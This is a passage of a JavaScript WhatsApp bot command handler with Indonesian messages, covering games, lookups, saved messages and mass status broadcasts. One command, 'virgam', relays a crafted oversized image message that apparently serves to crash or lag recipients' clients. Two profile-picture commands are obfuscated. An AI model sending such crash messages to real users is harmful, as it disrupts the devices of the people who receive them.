await fsx.copy(delb, `./database/Audio/${text}.mp3`)
fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
}
break
//=================================================//
case 'delvn':{
if (!isCreator) return reply('*Premium Only*')
await loading()
if (args.length < 1) return reply('Masukan query')
if (!vnnye.includes(text)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = vnnye.indexOf(text)
vnnye.splice(wanu, 1)
fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(`./database/Audio/${text}.mp3`)
reply(`Sukses delete vn ${text}`)
}
break
//=================================================//
case 'listvn':{
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 let teksooo = '┌──⭓「 *LIST VN* 」\n│\n'
for (let x of vnnye) {
teksooo += `│⭔ ${x}\n`
}
reply(teksooo)
}
break
//=================================================//
case 'addmsg': {
if (!isCreator) return reply('*Premium Only*')
await loading()
 if (!m.quoted) throw 'Reply Pesan Yang Ingin Disave Di Database'
 if (!text) throw `Example : ${prefix + command} nama file`
 let msgs = global.db.data.database
 if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
 msgs[text.toLowerCase()] = quoted.fakeObj
reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'

Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
}
break
//=================================================//
case 'sendlist': {
if (!isCreator) return reply('*Premium Only*')
await loading()
 if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
 let msgs = global.db.data.database
 if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
 zetsubo.copyNForward(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", msgs[text.toLowerCase()], true)
 reply(`Sukses Mengirim Pesan Ke ${m.quoted.sender}`)
}
break
//=================================================//
case 'listmsg': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 let msgs = global.db.data.database
let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
let teks = '「 LIST DATABASE 」\n\n'
for (let i of seplit) {
teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
}
reply(teks)
}
break
//=================================================//
case 'delmsg': case 'deletemsg': {
if (!isCreator) return reply('*Premium Only*')
await loading()
let msgs = global.db.data.database
if (!(text.toLowerCase() in msgs)) return reply(`'${text}' tidak terdaftar didalam list pesan`)
delete msgs[text.toLowerCase()]
reply(`Berhasil menghapus '${text}' dari list pesan`)
}
break
//=================================================//
case 'getmsg': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
 let msgs = global.db.data.database
 if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
 zetsubo.copyNForward(from, msgs[text.toLowerCase()], true)
}
break
//=================================================//
case 'google': {
 if (!text) throw `Example : ${prefix + command} fatih arridho`
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
reply(teks)
})
}
break
//=================================================//
case 'couple': {
await loading()
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
zetsubo.sendMessage(from, { image: { url: random.male }, caption: `Couple Male` }, {quoted:m})
zetsubo.sendMessage(from, { image: { url: random.female }, caption: `Couple Female` }, {quoted:m})
}
break
//=================================================//
case 'coffe': case 'kopi': {
await loading()
zetsubo.sendMessage(from, {image: { url: 'https://coffee.alexflipnote.dev/random' },
caption: `☕ Random Coffe`},{quoted:m})
}
break
//=================================================//
case 'getname': {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
await loading()
if (qtod === "true") {
namenye = await zetsubo.getName(m.quoted.sender)
reply(namenye)
} else if (qtod === "false") {
zetsubo.sendMessage(from, {text:"Reply orangnya"}, {quoted:m})
}
}
break
//=================================================//
case 'getpic': {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
await loading()
if (qtod === "true") {
try {
pporg = await zetsubo.profilePictureUrl(m.quoted.sender, 'image')
} catch {
pporg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
zetsubo.sendMessage(from, { image : { url : pporg }, caption:`Done` }, {quoted:m})
} else if (qtod === "false") {
try {
pporgs = await zetsubo.profilePictureUrl(from, 'image')
} catch {
pporgs = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
zetsubo.sendMessage(from, { image : { url : pporgs }, caption:`Done` }, {quoted:m})
}
}
break
//=================================================//
case 'setppbot': {
if (!isCreator) return reply('*Premium Only*')
await loading()
reply('*Sabar Cuy Loading*')
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
var _0x1c413d=_0x2a1c;(function(_0x477de5,_0x25404c){var _0xc6ef35=_0x2a1c,_0x1a86a3=_0x477de5();while(!![]){try{var _0x392e78=parseInt(_0xc6ef35(0xff))/0x1+-parseInt(_0xc6ef35(0xfc))/0x2+-parseInt(_0xc6ef35(0xf9))/0x3*(parseInt(_0xc6ef35(0xfe))/0x4)+parseInt(_0xc6ef35(0x103))/0x5*(parseInt(_0xc6ef35(0x100))/0x6)+parseInt(_0xc6ef35(0x105))/0x7+parseInt(_0xc6ef35(0x108))/0x8+-parseInt(_0xc6ef35(0x102))/0x9*(parseInt(_0xc6ef35(0xfd))/0xa);if(_0x392e78===_0x25404c)break;else _0x1a86a3['push'](_0x1a86a3['shift']());}catch(_0x4aa4a8){_0x1a86a3['push'](_0x1a86a3['shift']());}}}(_0x512f,0x3121c));var media=await zetsubo[_0x1c413d(0x10a)](quoted);function _0x2a1c(_0x26455a,_0x1953ac){var _0x512fee=_0x512f();return _0x2a1c=function(_0x2a1c5a,_0x267fa3){_0x2a1c5a=_0x2a1c5a-0xf8;var _0xfaa61b=_0x512fee[_0x2a1c5a];return _0xfaa61b;},_0x2a1c(_0x26455a,_0x1953ac);}try{if(args[0x0]==_0x1c413d(0xfa)){const {generateProfilePicture}=require('./lib/myfunc');var {img}=await generateProfilePicture(media);await zetsubo[_0x1c413d(0x106)]({'tag':'iq','attrs':{'to':botNumber,'type':'set','xmlns':_0x1c413d(0x107)},'content':[{'tag':_0x1c413d(0xf8),'attrs':{'type':_0x1c413d(0xfb)},'content':img}]});}else await zetsubo[_0x1c413d(0x101)](botNumber,{'url':media});m['reply'](mess[_0x1c413d(0x109)]);}catch{m[_0x1c413d(0x104)]('Gagal\x20Mengganti\x20Photo\x20Profile');}function _0x512f(){var _0x2f232f=['reply','1286194bdHKgR','query','w:profile:picture','3088072VzwWid','success','downloadAndSaveMediaMessage','picture','153igiZJi','/full','image','720650VaxDBN','2205790rCEybd','5796etOiDI','80334lizMjF','6GdpecB','updateProfilePicture','9DZAUSC','1029810dkCbDi'];_0x512f=function(){return _0x2f232f;};return _0x512f();}
}
break
//=================================================//
case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (!isCreator) return reply('*Premium Only*')
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
await loading()
reply('*Sabar Cuy Loading*')
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
const _0x3c52ee=_0x4109;(function(_0x1a4f9f,_0x3819cc){const _0x5c4a67=_0x4109,_0x4d0e21=_0x1a4f9f();while(!![]){try{const _0x2fe536=-parseInt(_0x5c4a67(0x78))/0x1+parseInt(_0x5c4a67(0x7a))/0x2*(-parseInt(_0x5c4a67(0x7e))/0x3)+parseInt(_0x5c4a67(0x73))/0x4+parseInt(_0x5c4a67(0x7c))/0x5+-parseInt(_0x5c4a67(0x72))/0x6+parseInt(_0x5c4a67(0x76))/0x7+parseInt(_0x5c4a67(0x70))/0x8;if(_0x2fe536===_0x3819cc)break;else _0x4d0e21['push'](_0x4d0e21['shift']());}catch(_0x3ccaac){_0x4d0e21['push'](_0x4d0e21['shift']());}}}(_0x38ce,0x9724c));function _0x4109(_0x2b2147,_0x340f6c){const _0x38ce6f=_0x38ce();return _0x4109=function(_0x410966,_0x2335d5){_0x410966=_0x410966-0x6d;let _0xbe9a92=_0x38ce6f[_0x410966];return _0xbe9a92;},_0x4109(_0x2b2147,_0x340f6c);}let media=await zetsubo['downloadAndSaveMediaMessage'](quoted);function _0x38ce(){const _0x2fbc7e=['43773HHkTHV','w:profile:picture','./lib/myfunc','chat','10418328MFCmiM','reply','6441450CkyNxQ','1458440XVIgpe','set','picture','4984819pxHUxY','/full','786695iyptWU','query','142qiVRKp','image','5681485dynfLf','Gagal\x20Mengganti\x20Photo\x20Profile'];_0x38ce=function(){return _0x2fbc7e;};return _0x38ce();}try{if(args[0x0]==_0x3c52ee(0x77)){const {generateProfilePicture}=require(_0x3c52ee(0x6e));var {img}=await generateProfilePicture(media);await zetsubo[_0x3c52ee(0x79)]({'tag':'iq','attrs':{'to':m[_0x3c52ee(0x6f)],'type':_0x3c52ee(0x74),'xmlns':_0x3c52ee(0x6d)},'content':[{'tag':_0x3c52ee(0x75),'attrs':{'type':_0x3c52ee(0x7b)},'content':img}]});}else await zetsubo['updateProfilePicture'](m[_0x3c52ee(0x6f)],{'url':media});m[_0x3c52ee(0x71)](mess['success']);}catch{m['reply'](_0x3c52ee(0x7d));}
}
break
//=================================================//
/*case 'block': {
if (!isCreator) return reply('*Premium Only*')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await zetsubo.updateBlockStatus(users, 'block').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break*/
//=================================================//
case 'unblock': {
if (!isCreator) return reply('*Premium Only*')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await zetsubo.updateBlockStatus(users, 'unblock').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
//=================================================//
case 'stalktiktok':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
if (args.length == 0) return reply(`Example: ${prefix + command} bulansutena`)
axios.get(`https://api.lolhuman.xyz/api/stalktiktok/${args[0]}?apikey=${apikey}`).then(({ data }) => {
var caption = `Username : ${data.result.username}\n`
caption += `Nickname : ${data.result.nickname}\n`
caption += `Followers : ${data.result.followers}\n`
caption += `Followings : ${data.result.followings}\n`
caption += `Likes : ${data.result.likes}\n`
caption += `Video : ${data.result.video}\n`
caption += `Bio : ${data.result.bio}\n`
zetsubo.sendMessage(from, { image: { url: data.result.user_picture }, caption })
})
break
//=================================================//
case 'infogempa':
var { data } = await axios.get(`https://api.lolhuman.xyz/api/infogempa?apikey=${apikey}`)
var caption = `Lokasi : ${data.result.lokasi}\n`
caption += `Waktu : ${data.result.waktu}\n`
caption += `Potensi : ${data.result.potensi}\n`
caption += `Magnitude : ${data.result.magnitude}\n`
caption += `Kedalaman : ${data.result.kedalaman}\n`
caption += `Koordinat : ${data.result.koordinat}`
zetsubo.sendMessage(from, { image: { url: data.result.map }, caption })
break
//=================================================
case 'lirik':
if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
var { data } = await axios.get(`https://api.lolhuman.xyz/api/lirik?apikey=${apikey}&query=${command}`)
reply(data.result)
break
//=================================================//
case 'jadwaltv':
if (args.length == 0) return reply(`Example: ${prefix + command} RCTI`)
var { data } = await axios.get(`https://api.lolhuman.xyz/api/jadwaltv/${args[0]}?apikey=${apikey}`)
var txtayaj = `Jadwal TV ${args[0].toUpperCase()}\n`
for (var x in data.result) {
txtayaj += `${x} - ${data.result[x]}\n`
}
reply(txtayaj)
break
//=================================================
case 'jadwaltvnow':
var { data } = await axios.get(`https://api.lolhuman.xyz/api/jadwaltv/now?apikey=${apikey}`)
var txtayajas = `Jadwal TV Now :\n`
for (var x in data.result) {
txtayajas += `${x.toUpperCase()}${data.result[x]}\n\n`
}
reply(txtayajas)
break
//=================================================
case 'cerpen':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
var { data } = await axios.get(`https://api.lolhuman.xyz/api/cerpen?apikey=${apikey}`)
var textpp = `Title : ${data.result.title}\n`
textpp += `Creator : ${data.result.creator}\n`
textpp += `Story :\n${data.result.cerpen}`
reply(textpp)
break
//=================================================
case 'ceritahoror':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
var { data } = await axios.get(`https://api.lolhuman.xyz/api/ceritahoror?apikey=${apikey}`)
var caption = `Title : ${data.result.title}\n`
caption += `Desc : ${data.result.desc}\n`
caption += `Story :\n${data.result.story}\n`
zetsubo.sendMessage(from, { image: { url: data.result.thumbnail }, caption })
break
//=================================================
case 'cuaca':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
var { data } = await axios.get(`https://api.lolhuman.xyz/api/cuaca/${args[0]}?apikey=${apikey}`)
var textppp = `Tempat : ${data.result.tempat}\n`
textppp += `Cuaca : ${data.result.cuaca}\n`
textppp += `Angin : ${data.result.angin}\n`
textppp += `Description : ${data.result.description}\n`
textppp += `Kelembapan : ${data.result.kelembapan}\n`
textppp += `Suhu : ${data.result.suhu}\n`
textppp += `Udara : ${data.result.udara}\n`
textppp += `Permukaan laut : ${data.result.permukaan_laut}\n`
zetsubo.sendMessage(from, { location: { degreesLatitude: data.result.latitude, degreesLongitude: data.result.longitude } })
reply(textppp)
break
//=================================================
case 'afk': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
reply(`${pushname}... Telah Afk Dengan Alasan ${text ? ': ' + text : ''}`)
}
break
//=================================================
case 'buatsw':{
if (!isCreator) return reply('*Premium Only*')
let men = [];
for (let x of pengguna) {
men.push(x)
const result = [ x ]
if (!m.quoted && !text) throw 'reply pesan'
if (m.quoted && m.quoted.mtype === 'conversation' && !text) _m = zetsubo.sendMessage('status@broadcast', {
text: m.quoted.text,
}, {
backgroundColor: '#FF000000',
font: 3,
statusJidList: result
});
if (!m.quoted && text) _m = zetsubo.sendMessage('status@broadcast', {
text,
}, {
backgroundColor: '#FF000000',
font: 3,
statusJidList: result
});
}
await loading ()
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
//=================================================
case 'virgam': {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
await loading()
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
	"imageMessage": {
	"url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m232/up-oil-image-b78d6ac8-7f22-41e9-982b-671521789ec1?ccb=9-4&oh=01_AdTbHXT85p8gfE104asrKWx3rZGkWuILwvlP4fehYEHLiw&oe=64E6E572&mms3=true",
	"mimetype": "image/jpeg",	
	"fileSha256": "TwxGIa1qFIDW39pvaGPl99aFqWf9xrJFMcDT16vT7U4=",
	"fileLength": "9565843",
	"height": 10000,
	"width": 10000,
	"mediaKey": "nnJ5XWdm409Z5qVLxUJUuVRUAUuNF44Gx5bsiCkrFEY=",
	"fileEncSha256": "OTCC5XCCa8rZMTD/ou8Q86dB3Vglqpx5bN0M8hCksCw=",
	"directPath": "/o1/v/t62.7118-24/f1/m232/up-oil-image-b78d6ac8-7f22-41e9-982b-671521789ec1?ccb=9-4&oh=01_AdTbHXT85p8gfE104asrKWx3rZGkWuILwvlP4fehYEHLiw&oe=64E6E572",
	"mediaKeyTimestamp": "1690265380",
	"jpegThumbnail": virgam,
	"scansSidecar": "/ZCEGb8p+SVtjE0eAKtM9SZyjz9cm9Utxmy/Zuvb8BbbG1V76XsTFA==",
	"scanLengths": [
687102,
6152788,
1292833,
1433120
	],
	"midQualityFileSha256": "R1EivePk56jyqH4iEQOfNOrKCiEfQCO9JYqtCwAdX4o="
}

}), { userJid: from, quoted:m})
zetsubo.relayMessage(from, document.message, { messageId: document.key.id })
}
await sleep(2000)
break
//=================================================
case "buatswimage":{
if (!isCreator) return reply('*Premium Only*')
await loading ()
 if (!quoted) throw `Balas image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Balas image dengan caption *${prefix + command}*`
const media = await zetsubo.downloadAndSaveMediaMessage(quoted)
zetsubo.sendMessage('status@broadcast', { image: { url: media }}, {statusJidList: pengguna})
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
//=================================================
case "buatswvideo":{
if (!isCreator) return reply('*Premium Only*')
await loading ()
 if (!quoted) throw `Balas video Dengan Caption ${prefix + command}`
if (!/video/.test(mime)) throw `Balas video dengan caption *${prefix + command}*`
const media = await zetsubo.downloadAndSaveMediaMessage(quoted)
zetsubo.sendMessage('status@broadcast', { video: { url: media }}, {statusJidList: pengguna})
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
//=================================================
case 'swin':{
if (!isCreator) return reply('*Premium Only*')
await loading ()
if (!text) return reply(`masukin text nya`)
zetsubo.sendMessage('status@broadcast', {
text: `${text}`
}, {
backgroundColor: '#FF000000',
font: 3,
statusJidList: pengguna
});
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
case 'vnsw':{
if (!isCreator) return reply('*Premium Only*')
await loading ()
if (!text) return reply(`masukin text nya yang ada di database listvn`)
var huy = fs.readFileSync(`./database/Audio/${text}.mp3`)
zetsubo.sendMessage('status@broadcast', {audio: huy, mimetype: 'audio/mp4', ptt:true},{
backgroundColor: '#FF000000',
statusJidList: pengguna
});
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
//=================================================
case 'inisw':{
if (!isCreator) return reply('*Premium Only*')
await loading ()
if (!text) return reply(`masukin text nya yang ada di database listvn`)
var buu = fs.readFileSync(`./database/Audio/${text}.mp3`)
zetsubo.sendMessage('status@broadcast', {audio: buu, mimetype:'audio/mp4', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/6289503267904',
title: `zetsubo`,
sourceUrl: `https://wa.me/6289503267904`, 
thumbnail: thumb}}},{
backgroundColor: '#FF000000',
statusJidList: pengguna
});
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
//=================================================
case 'hapusdb':
if (!isCreator) return reply('*Premium Only*')
await loading ()
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6289503267904@s.whatsapp.net`)
yakiii = text.split("|")[0].replace(/[^0-9]/g, '')
unnnp = pengguna.indexOf(yakiii)
pengguna.splice(unnnp, 1)
fs.writeFileSync('./database/user.json', JSON.stringify(pengguna, null, 2))
reply(`Nomor ${yakiii} Telah Di Hapus Dari Database!!!`)
break
//=================================================//
case 'listdb':
if (!isCreator) return reply('*Premium Only*')
await loading ()
if (isBan) return reply('*Lu Di Ban Owner*')
 teksoooo = '*List Database*\n\n'
for (let i of pengguna) {
teksoooo += `- ${i}\n`
}
teksoooo += `\n*Total : ${pengguna.length}*`
zetsubo.sendMessage(from, { text: teksoooo.trim() }, 'extendedTextMessage', { quoted:m, contextInfo: { "mentionedJid": pengguna } })
break
//=================================================
case "buatswptv":
{
if (!isCreator) return reply('*Premium Only*')
await loading ()
 if (!m.quoted) throw `Balas Video Dengan Caption ${prefix + command}`
var ppt = m.quoted
var ptv = generateWAMessageFromContent(from, proto.Message.fromObject({
	"ptvMessage": ppt
}), { userJid: from, quoted:m})
zetsubo.relayMessage('status@broadcast', ptv.message, {
statusJidList: pengguna
})
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
//=================================================
case 'toptv':
{
if (!isCreator) return reply('*Premium Only*')
await loading ()
 if (!m.quoted) throw `Balas Video Dengan Caption ${prefix + command}`
  if (/video/.test(mime)) {
var ppt = m.quoted
var ptv = generateWAMessageFromContent(from, proto.Message.fromObject({
	"ptvMessage": ppt
}), { userJid: from, quoted:m})
zetsubo.relayMessage(from, ptv.message, { messageId: ptv.key.id })
}
}
break
//=================================================
case "buatsws":{
if (!isCreator) return reply('*Premium Only*')
await loading ()
 if (!quoted) throw `Balas Sticker Dengan Caption ${prefix + command}`
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
const media = await zetsubo.downloadAndSaveMediaMessage(quoted)
zetsubo.sendMessage('status@broadcast', { sticker: { url: media }}, {statusJidList: pengguna})
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
//=================================================
case 'family100': {
 if ('family100'+from in _family100) {
 reply('Masih Ada Sesi Yang Belum Diselesaikan!')
 throw false
 }
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
 let random = anu[Math.floor(Math.random() * anu.length)]
 let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
 _family100['family100'+from] = {
 id: 'family100'+from,
 pesan: await zetsubo.sendText(from, hasil, m),
 ...random,
 terjawab: Array.from(random.jawaban, () => false),
 hadiah: 6,
 }
}
break
//=================================================//
case 'tebak': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
 if (args[0] === "lagu") {
 if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await JSON.parse(fs.readFileSync('./database/Games/tebaklagu.json'));
 let result = anu[Math.floor(Math.random() * anu.length)]
 let msg = await zetsubo.sendMessage(from, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, {quoted:m})
 zetsubo.sendText(from, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
 tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 zetsubo.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption:`Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lagu`},{quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'gambar') {
 if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 zetsubo.sendImage(from, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
 tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 zetsubo.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak gambar`}, {quoted:m}) 
 delete tebakgambar[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'kata') {
 if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 zetsubo.sendText(from, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
 tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 zetsubo.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak kata` }, {quoted:m}) 
 delete tebakkata[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'kalimat') {
 if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 zetsubo.sendText(from, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
 tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 zetsubo.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption:`Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak kalimat`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'lirik') {
 if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 zetsubo.sendText(from, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
 tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 zetsubo.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lirik`} , {quoted:m}) 
 delete tebaklirik[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'lontong') {
 if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 zetsubo.sendText(from, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
 caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
 })
 await sleep(60000)
 if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 zetsubo.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption:`Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
 }
 }
}
break
//=================================================//
case 'kuismath': case 'math': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let { genMath, modes } = require('./src/math')
 if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
 let result = await genMath(text.toLowerCase())
 zetsubo.sendText(from, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
 kuismath[m.sender.split('@')[0]] = result.jawaban
 })
 await sleep(result.waktu)
 if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
